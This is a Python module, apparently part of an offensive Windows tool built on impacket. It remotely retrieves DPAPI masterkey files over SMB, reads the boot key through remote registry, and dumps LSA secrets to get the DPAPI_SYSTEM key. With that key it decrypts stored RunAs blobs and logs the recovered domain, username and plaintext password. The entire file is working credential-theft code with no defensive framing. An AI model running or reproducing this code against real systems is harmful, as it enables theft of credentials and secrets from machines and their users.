from lib.logger import logger
from binascii import unhexlify, hexlify
from impacket.dpapi import MasterKeyFile, MasterKey, DPAPI_BLOB
from impacket.examples.secretsdump import RemoteOperations, LSASecrets
from impacket.uuid import bin_to_string
from impacket.structure import Structure
import sys
from binascii import unhexlify, hexlify
import base64
 
class DPAPI:
    def __init__(self, blob, smb_instance):
        
        self.dpapiSystem = {}
        self.smb = smb_instance
        self.raw_masterkeys = {}
        self.masterkeys = {}
        self.share = 'C$'
        # self.mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\' kill me
        self.mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\'
        self.tid = self.smb.smb_conn.connectTree(self.share)
        self.bootKey = None
        self.remote_ops = None
        self.lsa_secrets = None
        self.blob = blob

    def triage_masterkey(self, mkid = None):
        
        try:
            # retrieve masterkey file contents
            logger.debug("[*] Retrieving masterkey file: " + mkid)
            self.raw_masterkeys[mkid] = self.smb.getFileContent(self.share, self.mk_path, mkid)
            
            #if we can't retrieve the masterkey file, we exit
            if self.raw_masterkeys[mkid] is None:
                logger.info(f"[!] Could not get content of masterkey file: {mkid}, exiting since we can't decrypt the blob.")
                # self.smb.smb_conn.disconnectTree(self.tid)
                # sys.exit(1)
            
            #if we can retrieve the masterkey file, then we proceed to extract the bootkey
            logger.debug("[*] Attempting to extract bootkey from the target machine")
            try:
                self.remote_ops = RemoteOperations(
                    self.smb.smb_conn, doKerberos=False, kdcHost=None)
                self.remote_ops.enableRegistry()
                self.bootKey = self.remote_ops.getBootKey()
            except Exception as e:
                logger.info('[!] RemoteOperations failed: %s' % str(e))
            
            
            # with the bootkey, we can now extract LSA Secrets
            logger.debug('[*] Attempting to dump LSA secrets from the target machine')
            try:
                SECURITYFileName = self.remote_ops.saveSECURITY()
                self.lsa_secrets = LSASecrets(SECURITYFileName, self.bootKey, self.remote_ops,
                                            isRemote=True, history=False,
                                            perSecretCallback=self.getDPAPI_SYSTEM)
                self.lsa_secrets.dumpSecrets()
            except Exception as e:
                logger.info('[!] LSA hashes extraction failed: %s' % str(e))
            
            self.cleanup()          
            
            

            # now that we have the SYSTEM user key, we can decrypt the masterkey
            if self.dpapiSystem['UserKey'] is None:
                logger.info(
                    "[!] Could not retrieve the SYSTEM user key, exiting since we can't decrypt the blob.")
                self.smb.smb_conn.disconnectTree(self.tid)
                return
            for k, v in self.raw_masterkeys.items():
                if v is None:
                    self.masterkeys[k] = None
                    continue
                data = v
                mkf = MasterKeyFile(data)
                data = data[len(mkf):]
                if not mkf['MasterKeyLen'] > 0:
                    logger.info("[!] Masterkey file " + k +
                                " has no masterkeys, skipping.")
                    continue
                mk = MasterKey(data[:mkf['MasterKeyLen']])

                data = data[len(mk):]
                # decrypted_key = mk.decrypt(self.dpapiSystem['UserKey']) kill me twice
                decrypted_key = mk.decrypt(self.dpapiSystem['MachineKey'])
                if not decrypted_key:
                    logger.info("[!] Failed to decrypt masterkey " + k + ", skipping.")
                    continue
                logger.debug("[*] Decrypted masterkey " + k + ": 0x" + hexlify(decrypted_key).decode('utf-8'))
                self.masterkeys[k] = decrypted_key
        except (Exception, KeyboardInterrupt) as e:
            logger.info(e)
            try:
                self.cleanup()
            except:
                pass

        return

    def decrypt_blob(self):
        entropy_size = 0x400
        for blob in self.blob:
            blob_data = blob[:-entropy_size]
            entropy = blob[-entropy_size:]
    

            # Identify the masterkey from the blob
            blob = DPAPI_BLOB(blob_data)
            mkid = bin_to_string(blob['GuidMasterKey'])
            

            
            # If we don't have the masterkey, we triage it
            if mkid not in self.raw_masterkeys:
                self.triage_masterkey(mkid)

            
            key = self.masterkeys.get(mkid, None)
            if key is None:
                logger.info("[!] Could not decrypt masterkey " + mkid)
                return None
            
            decrypted = blob.decrypt(key, entropy)
            decoded_string = decrypted.decode('utf-16le').split('\x00')
            domain, username, password = decoded_string[:3]
            logger.info(f"[+] Got RunAs Credential: {domain}\\{username}:{password}")
            return decoded_string

    def cleanup(self):
        if self.remote_ops:
            self.remote_ops.finish()
        if self.lsa_secrets:
            self.lsa_secrets.finish()

    def getDPAPI_SYSTEM(self,_, secret):
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split('\n')
            machineKey = machineKey.split(':')[1]
            userKey = userKey.split(':')[1]
            self.dpapiSystem['MachineKey'] = unhexlify(machineKey[2:])
            self.dpapiSystem['UserKey'] = unhexlify(userKey[2:])



